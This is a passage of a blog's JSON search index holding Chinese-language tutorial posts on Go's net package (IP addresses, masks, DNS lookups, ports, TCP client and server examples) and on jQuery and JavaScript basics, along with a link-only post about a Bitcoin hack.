TCPv6连接还是两者皆可。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[5]-tcpaddr","slug":"go-network-5-tcpaddr","date":"2019-01-18T14:46:12.000Z","updated":"2019-02-04T08:38:16.420Z","comments":true,"path":"2019/01/18/go-network-5-tcpaddr/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-5-tcpaddr/","excerpt":"","text":"TCPAddr type TCPAddr struct { IP IP Port int } ResolveTCPAddr函数用于创建TCPAddr 1func ResolveTCPAddr(net, addr string) (*TCPAddr, os.Error) 其中参数net是“tcp”，“tcp4”或“tcp6”之一，addr是由主机名或IP地址组成的字符串，后跟“：”后面的端口号，例如“www.google.com:80“或”127.0.0.1:22“。 12345678func DialTCP(net string, laddr, raddr *TCPAddr) (c *TCPConn, err os.Error)func (c *TCPConn) SetTimeout(nsec int64) os.Error即使客户端无需发送任何内容，客户端也可能希望保持与服务器的连接。它可以使用:func (c *TCPConn) SetKeepAlive(keepalive bool) os.Errorfunc (c *TCPConn) Write(b []byte) (n int, err os.Error)func (c *TCPConn) Read(b []byte) (n int, err os.Error) 客户端 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* GetHeadInfo */package mainimport ( \"net\" \"os\" \"fmt\" \"io/ioutil\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s host:port \", os.Args[0]) os.Exit(1) &#125; service := os.Args[1] // 生成TCPAddr tcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service) checkError(err) // 创建网络连接 conn, err := net.DialTCP(\"tcp\", nil, tcpAddr) checkError(err) // 写数据 _, err = conn.Write([]byte(\"HEAD / HTTP/1.0\\r\\n\\r\\n\")) checkError(err) // 读数据 result, err := ioutil.ReadAll(conn) checkError(err) fmt.Println(string(result)) os.Exit(0)&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 测试 1234567$ ./net www.baidu.com:80HTTP/1.0 302 FoundContent-Length: 17931Content-Type: text/htmlDate: Fri, 18 Jan 2019 15:33:50 GMTEtag: &quot;54d9748e-460b&quot;Server: bfe/1.0.8.18 服务器 12func ListenTCP(net string, laddr *TCPAddr) (l *TCPListener, err os.Error)func (l *TCPListener) Accept() (c Conn, err os.Error) ListenTCP为服务器监听端口，Accept代表锁住，等待客户端连接 1234567891011121314151617181920212223242526272829303132333435363738/* DaytimeServer */package mainimport ( \"fmt\" \"net\" \"os\" \"time\")func main() &#123; service := \":1200\" tcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service) checkError(err) listener, err := net.ListenTCP(\"tcp\", tcpAddr) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; daytime := time.Now().String() conn.Write([]byte(daytime)) // don't care about return value conn.Close() // we're finished with this client &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125; 多线程服务器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* ThreadedEchoServer */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; service := \":1201\" tcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service) checkError(err) listener, err := net.ListenTCP(\"tcp\", tcpAddr) checkError(err) for &#123; conn, err := listener.Accept() if err != nil &#123; continue &#125; // run as a goroutine go handleClient(conn) &#125;&#125;func handleClient(conn net.Conn) &#123; // close connection on exit defer conn.Close() var buf [512]byte for &#123; // read upto 512 bytes n, err := conn.Read(buf[0:]) if err != nil &#123; return &#125; // write the n bytes read _, err2 := conn.Write(buf[0:n]) if err2 != nil &#123; return &#125; &#125;&#125;func checkError(err error) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error()) os.Exit(1) &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[4]-port","slug":"go-network-4-port","date":"2019-01-18T14:31:06.000Z","updated":"2019-02-04T08:38:11.498Z","comments":true,"path":"2019/01/18/go-network-4-port/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-4-port/","excerpt":"","text":"端口port 服务器运行在主机上。 IP地址将定位主机。但是在每台计算机上可能有很多服务，需要一种简单的方法来区分它们。 TCP，UDP，SCTP等使用的方法是使用端口号。 有许多“标准”端口。 Telnet通常使用端口23，TCP协议。 DNS使用端口53，使用TCP或UDP。 FTP使用端口21和20，一个用于命令，另一个用于数据传输。 HTTP通常使用端口80，但它通常使用端口8000,8080和8088，所有端口都使用TCP。 在Unix系统上，常用端口列在文件/etc/services中。 Go具有查询此文件的功能 1func LookupPort(network, service string) (port int, err os.Error) 123456789101112131415161718192021222324252627282930/* LookupPort */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; if len(os.Args) != 3 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s network-type service\\n\", os.Args[0]) os.Exit(1) &#125; networkType := os.Args[1] service := os.Args[2] port, err := net.LookupPort(networkType, service) if err != nil &#123; fmt.Println(\"Error: \", err.Error()) os.Exit(2) &#125; fmt.Println(\"Service port \", port) os.Exit(0)&#125; 测试 12$ ./net tcp telnetService port 23","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[3]-IPAddr","slug":"go-network-3-IPAddr","date":"2019-01-18T11:01:34.000Z","updated":"2019-02-04T08:38:07.092Z","comments":true,"path":"2019/01/18/go-network-3-IPAddr/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-3-IPAddr/","excerpt":"","text":"IPAddr type IPAddr { IP IP } 此类型的主要用途是对IP主机名执行DNS查找。 1func ResolveIPAddr(net, addr string) (*IPAddr, os.Error) 123456789101112131415161718192021222324252627/* ResolveIP */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s hostname\\n\", os.Args[0]) fmt.Println(\"Usage: \", os.Args[0], \"hostname\") os.Exit(1) &#125; name := os.Args[1] addr, err := net.ResolveIPAddr(\"ip\", name) if err != nil &#123; fmt.Println(\"Resolution error\", err.Error()) os.Exit(1) &#125; fmt.Println(\"Resolved address is \", addr.String()) os.Exit(0)&#125; 测试 12$ ./net www.baidu.comResolved address is 14.215.177.39 ResolveIPAddr函数将对主机名执行DNS查找，并返回单个IP地址。 但是，主机可能有多个IP地址，通常来自多个网卡。它们也可能有多个主机名，充当别名。 1func LookupHost(name string) (addrs []string, err os.Error) 其中一个地址将被标记为“规范(canonical)”主机名。如果您希望找到规范名称，请使用 1func LookupCNAME(name string) (cname string, err os.Error) 1234567891011121314151617181920212223242526272829/* LookupHost */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s hostname\\n\", os.Args[0]) os.Exit(1) &#125; name := os.Args[1] addrs, err := net.LookupHost(name) if err != nil &#123; fmt.Println(\"Error: \", err.Error()) os.Exit(2) &#125; for _, s := range addrs &#123; fmt.Println(s) &#125; os.Exit(0)&#125; 测试2 1234$ go build .jacksondeMacBook-Pro:net jackson$ ./net www.baidu.com14.215.177.3814.215.177.39","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[2]-ipmask","slug":"go-network-2-ipmask","date":"2019-01-18T10:47:28.000Z","updated":"2019-02-04T08:38:02.361Z","comments":true,"path":"2019/01/18/go-network-2-ipmask/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-2-ipmask/","excerpt":"","text":"IPMask ipmask存储掩码，掩码是指定ip地址中前多少位是网络地址的。 type IPMask []byte 123456789101112131415161718192021222324252627282930313233/* Mask */package mainimport ( \"fmt\" \"net\" \"os\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s dotted-ip-addr\\n\", os.Args[0]) os.Exit(1) &#125; dotAddr := os.Args[1] addr := net.ParseIP(dotAddr) if addr == nil &#123; fmt.Println(\"Invalid address\") os.Exit(1) &#125; mask := addr.DefaultMask() network := addr.Mask(mask) ones, bits := mask.Size() fmt.Println(\"Address is \", addr.String(), \" Default mask length is \", bits, \"Leading ones count is \", ones, \"Mask is (hex) \", mask.String(), \" Network is \", network.String()) os.Exit(0)&#125; 测试 123$ go build .$ ./net 127.0.0.1Address is 127.0.0.1 Default mask length is 32 Leading ones count is 8 Mask is (hex) ff000000 Network is 127.0.0.0","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[1]-ipaddress","slug":"go-network-1-ipaddress","date":"2019-01-18T10:42:24.000Z","updated":"2019-02-04T08:37:52.825Z","comments":true,"path":"2019/01/18/go-network-1-ipaddress/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/go-network-1-ipaddress/","excerpt":"","text":"net包中的ip类型存储ip地址 type IP []byte 1234567891011121314151617181920212223242526/* IP */package mainimport ( \"net\" \"os\" \"fmt\")func main() &#123; if len(os.Args) != 2 &#123; fmt.Fprintf(os.Stderr, \"Usage: %s ip-addr\\n\", os.Args[0]) os.Exit(1) &#125; name := os.Args[1] addr := net.ParseIP(name) if addr == nil &#123; fmt.Println(\"Invalid address\") &#125; else &#123; fmt.Println(\"The address is \", addr.String()) &#125; os.Exit(0)&#125; 测试： 123$ go build .$ ./net 127.0.0.1The address is 127.0.0.1","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"jquery","slug":"jquery","date":"2019-01-18T08:19:13.000Z","updated":"2019-01-29T10:49:42.017Z","comments":true,"path":"2019/01/18/jquery/","link":"","permalink":"https://dreamerjonson.com/2019/01/18/jquery/","excerpt":"","text":"导入包 1、Download jQuery and link to it locally: 2、Link to a CDN(a hosted copy) api文档：http://api.jquery.com/ 修改css 1234567891011121314151617$(selector).css(property, value)//select elem with id \"special\" and give it a border$(\"#special\").css(\"border\", \"2px solid red\");//we can also pass in an object with stylesvar styles = &#123;backgroundColor : \"pink\",fontWeight: \"bold\"&#125;;$(\"#special\").css(styles);//select all li's and make them yellow$(\"li\").css(\"color\", \"yellow\");//select all elements with class \"big\"//and give them an orange border$(\".big\").css(\"border\", \"1px dashed orange\"); 方法 获取文本与修改文本： text：http://api.jquery.com/text/ html:http://api.jquery.com/html/ 获取input选择框的值。 val()😒(“input”).val():http://api.jquery.com/val/ 获取修改属性： attr(): $( “#greatphoto” ).attr( “title”, “Photo by Kelly Clark” );http://api.jquery.com/attr/ addClass() removeClass() toggleClass() 事件 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jQuery Events&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;jQuery Events&lt;/h1&gt;&lt;h1&gt;jQuery Events&lt;/h1&gt;&lt;h1&gt;jQuery Events&lt;/h1&gt;&lt;input type=&quot;text&quot;&gt;&lt;button&gt;Don&apos;t Click Me&lt;/button&gt;&lt;button&gt;Sersiouly Don&apos;t Click Me&lt;/button&gt;&lt;button&gt;This is your last warning!&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425$(&apos;#submit&apos;).click(function()&#123; console.log(&quot;aaa&quot;)&#125;)$(&apos;button&apos;).click(function()&#123; alert(&quot;bbb&quot;)&#125;)$(&quot;button&quot;).click(function()&#123; var text = $(this).text();console.log(&quot;you clicks &quot;+ text) &#125;) //键盘按下事件，打印事件对象信息。 $(&quot;input&quot;).keypress(function(event)&#123; console.log(event);&#125;);$(&quot;input&quot;).keypress(function(event)&#123; //判断鼠标按下 if(event.which ===13)&#123; alert(&quot;you hit enter!&quot;); &#125;&#125;); 鼠标按下事件代码： https://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes","categories":[{"name":"js","slug":"js","permalink":"https://dreamerjonson.com/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://dreamerjonson.com/tags/js/"}]},{"title":"比特币历史上最大的一次黑客袭击事件","slug":"bitocin-attact","date":"2019-01-12T13:42:04.000Z","updated":"2019-01-12T13:43:11.952Z","comments":true,"path":"2019/01/12/bitocin-attact/","link":"","permalink":"https://dreamerjonson.com/2019/01/12/bitocin-attact/","excerpt":"","text":"参考资料： https://hackernoon.com/bitcoins-biggest-hack-in-history-184-4-ded46310d4ef https://en.bitcoinwiki.org/wiki/Value_overflow_incident","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]},{"title":"javascript","slug":"javascript","date":"2019-01-11T03:28:33.000Z","updated":"2019-01-16T14:56:09.911Z","comments":true,"path":"2019/01/11/javascript/","link":"","permalink":"https://dreamerjonson.com/2019/01/11/javascript/","excerpt":"","text":"基本类型 12345678910111213141516171819202122//Numbers49.3-10//Strings&quot;Hello World&quot;&quot;43&quot;//Booleanstruefalse//null and undefinednullundefinedtypeof 查看变量的数据类型。使用格式： typeof 变量名 number基本运算： 123456789101112131415//Numbers49.3-10//We can do some math4 + 10 //141/5 //0.2//Modulo - remainder operator10 % 3 //124 % 2 //015 % 11 //4 字符串基本运算： 1234567891011121314151617//Single or Double quotes OK\"hello world\"'hello world'//Concatenation\"charlie\" + \"brown\" //\"charliebrown\"//Escape Characters start with \"\\\"\"Singin \\\"Do wah diddy, diddy, dum diddy do\\\" \"\"This is a backslash: \\\\\"//Strings have a length property\"hello world\".length //11//Access individual characters using [] and an index\"hello\"[0] //\"h\"\"hello\"[4] //\"o\" 变量 12345678910111213141516171819202122232425262728变量 格式：var 变量名 = 数据; 声明变量要注意的事项：1.在javascript中声明变量是 使用var关键字声明的，javascript中的变量可以存储任意的数据类型数据.2.javascript中变量数据类型是根据存储的值决定的，可以随时更改存储数据的类型。3.定义了多个同名的变量是，后定义的同名变量是覆盖前面定义的同名变量。4.声明变量的时候可以省略var关键字，但是不建议省略。//Variables are simply containers that store values//They follow this pattern:var yourVariableName = yourValue;//They can store all of the values we&apos;ve seenvar name = &quot;Rusty&quot;;var secretNumber = 73;var isAdorable = true;//Recall the stored value by calling the variable namevar name = &quot;Rusty&quot;;&quot;hello there &quot; + name //&quot;hello there Rusty&quot;var num = 37;num + 3 + 10 //50//We can also update existing variablesvar name = &quot;Robert&quot;;name = &quot;Bob&quot;; null &amp; undefined 1234567891011//The two other primitives are null and undefined//Variables that are declared but not//initialized are undefined//The following variables are undefined:var name;var age;//null is &quot;explicitly nothing&quot;var currentPlayer = &quot;charlie&quot;;currentPlayer = null; //game over 常用输出语句 1234alert() //弹出警告框console.log() //只在控制台输出prompt //弹出输入框案例见下 js代码分离 index.html: 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Script Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Including JS Files&lt;/h1&gt;&lt;script src=\"script.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; script.js: 123var userName = prompt(\"What is your name?\");alert(\"Nice to meet you, \" + userName);console.log(\"Also great to meet you, \" + userName); 布尔逻辑 Operator Name Example ​Result &gt; Greater than x &gt; 10 FALSE &gt;= Greater than or equal to x &gt;= 5 TRUE &lt; Less than x &lt; -50 FALSE &lt;= Less than or equal to x &lt;= 100 TRUE == Equal to x == “5” TRUE != Not equal to x != “b” TRUE === Equal value and type x === “5” FALSE !== Not equal value or equal type x !== “5” TRUE 双等号与三等号比较特殊，双等号会转换类型让两者匹配再比较大小，而三个等号会比较类型。 123456789101112131415161718192021var x = 99;x == \"99\" //truex === \"99\" //falsevar y = null;y == undefined //truey === undefined //falsetrue == \"1\" //true0 == false //truenull == undefined //trueNaN == NaN //false Operator Name Example ​Result &amp;&amp; AND x &lt; 10 &amp;&amp; x !== 5 false || OR y &gt; 9 || x === 5 true ! NOT !(x === y) true 练习1： 1234var x = 10;var y = &quot;a&quot;y === &quot;b&quot; || x &gt;= 10 练习2： 1234var x = 3;var y = 8;!(x == &quot;3&quot; || x === y) &amp;&amp; !(y != 8 &amp;&amp; x &lt;= y) 练习3： 1234567891011!&quot;Hello World&quot;!&quot;&quot;!null!0!-1!NaN if if 判断语句的语法： if (condition) statement1 else if statement2 else statement3 如果条件计算结果为 true，则执行 statement1；如果条件计算结果为 false，则执行 statement2。 注意判断的条件会发生自动类型转换： number：如果非0为true，0为false string：如果非null或非空为true，否则为false undefined：false NaN: false 对象类型：非null为true，否则为false。 案例猜数字游戏： 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Guessing Game&lt;/title&gt;&lt;script type=\"text/javascript\"&gt; //create secretNumber var secretNumber = 4; //ask user for guess var stringGuess = prompt(\"Guess a number\"); var guess = Number(stringGuess); //check if guess is right if(guess === secretNumber) &#123; alert(\"YOU GOT IT RIGHT!\"); &#125; //check if guess is higher else if(guess &gt; secretNumber)&#123; alert(\"Too high. Guess again!\"); &#125; else &#123; alert(\"Too low. Guess again!\"); &#125; //otherwise, check if lower&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; case 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051case选择语句： switch语句 switch(变量)&#123; case 值1: break; case 值2： break; case 值3: break; ..... default： break; &#125; 特殊之处： 在javascript中case后面可以跟常量与变量还可以跟表达式。 案例一： function test6() &#123; var color = \"xx\"; var value1 = \"red\", value2 = \"green\"; switch(color) &#123; case value1: alert(\"红色\"); break; case value2: alert(\"绿色\"); break; default: alert(\"执行默认default\"); &#125;&#125;这里，switch 语句用于字符串 Color，声明 case 使用的是变量 BLUE、RED 和 GREEN，这在 ECMAScript 中是完全有效的。案例二：var num = 20;switch(true) &#123; case num &gt;= 0 &amp;&amp; num &lt;= 10: alert(\"大于0小于等于10\"); break; case num&gt;10 &amp;&amp; num&lt;=20: alert(\"大于10小于等于20\"); break;&#125; 循环语句 while while循环语句： 格式： while(判断的条件){ 循环体内容 } while(count&lt;5){ document.write(“hello world”); count++; } do-while循环语句 do{ 循环语句； }while(判断条件); 需求；计算1~100奇数的总和。 var num = 1; var result = 0; do{ if(num%2!=0){ result +=num; } num++; }while(num&lt;=100); document.write(&quot;结果：&quot;+result); for循环语句: 格式： for(初始化语句; 判断的条件 ; 循环后的语句){ 循环体语句； } 需求；计算1~100偶数的总和。 var result = 0 ; for(var i = 1 ; i&lt;=100 ; i++){ if(i%2==0){ result +=i; } } document.write(“结果：”+result); 测试 1234567891011121314151617181920212223242526272829303132333435363738console.log(\"PRINTING ALL NUMBERS BETWEEN -10 AND 19\");for(var i = -10; i &lt; 20; i++)&#123; console.log(i)&#125;console.log(\"PRINTING ALL EVEN BETWEEN 10 AND 40\");// for(var i = 11; i &lt;= 40; i += 2)&#123;// console.log(i);// &#125;for(var i = 10; i &lt;= 40; i += 1)&#123; if(i % 2 === 0) &#123; console.log(i); &#125;&#125;console.log(\"PRINTING ALL ODD NUMBERS BETWEEN 300 AND 333\");for(var i = 300; i &lt;= 333; i++) &#123; if(i % 2 !== 0) &#123; console.log(i); &#125;&#125;console.log(\"PRINTING ALL NUMBERS DIVISIBLE BY 5 AND 3 BETWEEN 5 AND 50\");for(var i = 5; i &lt;= 50; i++)&#123; if(i % 5 === 0 &amp;&amp; i % 3 === 0) &#123; console.log(i); &#125;&#125; 函数function 函数的定义格式： function 函数名(形参列表){ 函数体 ; } javascript的函数要注意的细节： 1. 在 javascript中函数 定义形参时是不能使用var关键字声明变量 的。 2. 在javascript中 的函数是没有返回值类型 的，如果函数需要返回数据给调用者，直接return返回即可，如果不需要返回则不返回。 3. 在 javascript中是没有函数 重载 的概念 的，后定义的同名函数会直接覆盖前面定义同名函数。 4. 在javascript中任何的函数内部都隐式的维护了一个arguments（数组）的对象，给函数 传递数据的时候，是会先传递到arguments对象中， 然后再由arguments对象分配数据给形参的。 5.函数本身就是一个对象，此对象的名字就是函数名 需求：定义一个函数做两个参数的加法功能。 12345678910111213function add(a,b)&#123; var sum = a+b; return sum;&#125;function add()&#123; for(var index = 0 ; index&lt;arguments.length ; index++)&#123; console.log(arguments[index]+&quot;,&quot;); &#125;&#125;//调用函数add(11,21,13,14); 函数本身就是一个对象，此对象的名字就是函数名 12345function show (a) &#123; // body...&#125;var p = show;alert(p);//此语句将会把函数的所有内容都打印出来 动态函数 动态函数的特点时new一个Function对象，往对象中可以传入变量，函数体，以及输出语句。 123var show = new Function(&quot;x&quot;,&quot;y&quot;,&quot;var sum = x + y;return sum;&quot;);var p = show(1,5);alert(p); 匿名函数,通常在定义事件属性的行为时较为常用。 12var show = function()&#123;alert(&quot;哈哈&quot;)&#125;;//此为常见了一个匿名函数，并为其取了一个名字show。show(); 数组 初始化数组： 123456789101112131415161718192021222324var friends = [&quot;Charlie&quot;, &quot;Liz&quot;, &quot;David&quot;, &quot;Mattias&quot;];//初始化一个空的数组var friends = []; //no friends :(var friends = new Array() //uncommon//Arrays can hold any type of datavar random_collection = [49, true, &quot;Hermione&quot;, null];Arrays let us group data together in listsArray are indexed starting at 0. Every slot has a corresponding numberWe can use those indices to retrieve datavar friends = [&quot;Charlie&quot;, &quot;Liz&quot;, &quot;David&quot;, &quot;Mattias&quot;];console.log(friends[0]) //&quot;Charlie&quot;friends[1] + &quot; &lt;3 &quot; + friends[2] //&quot;Liz &lt;3 David&quot;Arrays have a length property:var nums = [45,37,89,24];nums.length //4 更新数组： 1234567var friends = [&quot;Charlie&quot;, &quot;Liz&quot;, &quot;David&quot;, &quot;Mattias&quot;];friends[0] = &quot;Chuck&quot;;friends[1] = &quot;Lizzie&quot;;//增加新元素var friends = [&quot;Charlie&quot;, &quot;Liz&quot;, &quot;David&quot;, &quot;Mattias&quot;];friends[4] = &quot;Amelie&quot;; 数组方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253var colors = [&quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;];colors.push(&quot;green&quot;);//[&quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;, &quot;green&quot;]var colors = [&quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;];colors.pop();//[&quot;red&quot;, &quot;orange&quot;]//pop() returns the removed elementvar col = colors.pop(); //orangevar colors = [&quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;];colors.unshift(&quot;infrared&quot;)//[&quot;infrared&quot;, &quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;]var colors = [&quot;red&quot;, &quot;orange&quot;, &quot;yellow&quot;];colors.shift();//[&quot;orange&quot;, &quot;yellow&quot;]//shift() also returns the removed elementvar col = colors.shift(); //orangevar friends = [&quot;Charlie&quot;, &quot;Liz&quot;, &quot;David&quot;, &quot;Mattias&quot;, &quot;Liz&quot;];//returns the first index at which a given element can be foundfriends.indexOf(&quot;David&quot;); //2friends.indexOf(&quot;Liz&quot;); //1, not 4//returns -1 if the element is not present.friends.indexOf(&quot;Hagrid&quot;); //-1var fruits = [&apos;Banana&apos;, &apos;Orange&apos;, &apos;Lemon&apos;, &apos;Apple&apos;, &apos;Mango&apos;];//use slice to copy the 2nd and 3d fruits//specify index where the new array starts(1) and ends(3)var citrus = fruits.slice(1, 3);//this does not alter the original fruits array//citrus contains [&apos;Orange&apos;,&apos;Lemon&apos;]//fruits contains [&apos;Banana&apos;, &apos;Orange&apos;, &apos;Lemon&apos;, &apos;Apple&apos;, &apos;Mango&apos;];//you can also use slice() to copy an entire arrayvar nums = [1,2,3];var otherNums = nums.slice();//both arrays are [1,2,3]var fruits = [&apos;Banana&apos;, &apos;Orange&apos;, &apos;Lemon&apos;, &apos;Apple&apos;, &apos;Mango&apos;];//use splice to remove &apos;Orange&apos; from the array//specify index of the element to be removed and//how many elements should be removed from that indexfruits.splice(1, 1);// returns: [&quot;Orange&quot;]console.log(fruits);// prints: [&quot;Banana&quot;, &quot;Lemon&quot;, &quot;Apple&quot;, &quot;Mango&quot;] 数组循环： 12345678910111213//with a for loopvar colors = [\"red\", \"orange\", \"yellow\", \"green\"];for(var i = 0; i &lt; colors.length; i++) &#123; console.log(colors[i]);&#125;//using forEachvar colors = [\"red\", \"orange\",\"yellow\", \"green\"];colors.forEach(function(color)&#123; console.log(color);&#125;); 案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Todo List&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var todos = [\"Buy New Turtle\"];var input = prompt(\"What would you like to do?\");while(input !== \"quit\")&#123; //handle input if(input === \"list\") &#123; printList(); &#125; else if(input === \"new\") &#123; addTodo(); &#125; else if(input === \"delete\") &#123; deleteTodo(); &#125; //ask again for new input input = prompt(\"What would you like to do?\");&#125;console.log(\"OK, YOU QUIT THE APP\");function printList() &#123; console.log(\"**********\"); todos.forEach(function(todo, index)&#123; console.log(index + \": \" + todo); &#125;); console.log(\"**********\");&#125;function addTodo()&#123; //ask for new todo var newTodo = prompt(\"Enter new todo\"); //add to todos array todos.push(newTodo); console.log(newTodo + \" added to list\")&#125;function deleteTodo()&#123; var index = prompt(\"Enter index of todo to delete\"); todos.splice(index, 1); console.log(\"Todo Removed\")&#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Todo List&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;\"new\" - Add A Todo&lt;/li&gt; &lt;li&gt;\"list\" - List All Todos&lt;/li&gt; &lt;li&gt;\"delete\" - Remove Specific Todo&lt;/li&gt; &lt;li&gt;\"quit\" - Quit App&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 案例2：构建自己的foreach 123456789101112131415161718192021222324252627// =========// VERSION 1// =========function myForEach(arr, func)&#123; for (var i = 0; i &lt; arr.length; i++) &#123; func(arr[i]); &#125;&#125;var colors = [\"red\", \"orange\", \"yellow\", \"green\", \"blue\", \"PURPLE\"];myForEach(colors, function(color)&#123; console.log(color);&#125;);// =========// VERSION 2// =========Array.prototype.myForEach = function(func)&#123; for(var i = 0; i &lt; this.length; i++) &#123; func(this[i]); &#125;&#125;;var colors = [\"red\", \"orange\", \"yellow\", \"green\", \"blue\", \"PURPLE\"];colors.myForEach(function(color)&#123; console.log(color);&#125;); 对象 1234567891011121314151617181920212223var person = &#123;name: \"Travis\",age: 21,city: \"LA\"&#125;;//bracket notation, similar to arrays:console.log(person[\"name\"]);//dot notation:console.log(person.name);There are a few differences between the 2 notations://you cannot use dot notation if the property starts with a numbersomeObject.1blah //INVALIDsomeObject[\"1blah\"] //VALID!//you can lookup using a variable with bracket notationvar str = \"name\";someObject.str //doesn't look for \"name\"someObject[str] //does evaluate str and looks for \"name\"//you cannot use dot notation for property names with spacessomeObject.fav color //INVALIDsomeObject[\"fav color\"]; //VALID 对象更新 123456789var person = &#123;name: &quot;Travis&quot;,age: 21,city: &quot;LA&quot;&#125;;//to update ageperson[&quot;age&quot;] += 1;//to update cityperson.city = &quot;London&quot;; 创建对象 12345678910111213141516//make an empty object and then add to itvar person = &#123;&#125;person.name = &quot;Travis&quot;;person.age = 21;person.city = &quot;LA&quot;;//all at oncevar person = &#123;name: &quot;Travis&quot;,age: 21,city: &quot;LA&quot;&#125;;//another way of initializing an Objectvar person = new Object();person.name = &quot;Travis&quot;;person.age = 21;person.city = &quot;LA&quot;; 对象中可以容纳任何数据 var junkObject = { age: 57, color: “purple”, isHungry: true, friends: [“Horatio”, “Hamlet”], pet: { name: “Rusty”, species: “Dog”, age: 2 } }; 对象中可以容纳方法 junkObject.add = function(a,b){ return a+b; } 使用this，使用对象中的已有元素 junkObject.print = function(){ this.friends.forEach(function(arr){console.log(arr);}); } DOM The Document Object Model is the interface between your Javascript and HTML+CSS 在控制台输入：document 以及 console.dir(document)即会显示出js文档对象 1234567891011121314151617181920As you begin working with the DOM you'll be writing some JavaScript code that selects HTML elements from the page and manipulates them.When doing this, be sure to include your JavaScript code at the bottom of the HTML document, right before the closing &lt;/body&gt; tag.The HTML will need to have loaded before the JavaScript is run, otherwise the JavaScript will throw an error because the HTML that it is trying to select and manipulate doesn't exist (yet).See example below:&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Some HTML Code Here&lt;/h1&gt; &lt;script src=\"scriptfile.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; dom 5类选择器 document.getElementById() document.getElementsByClassName() document.getElementsByTagName() document.querySelector() document.querySelectorAll() Hello Goodbye List Item 1 List Item 2 List Item 3 var tag = document.getElementById(“highlight”); var 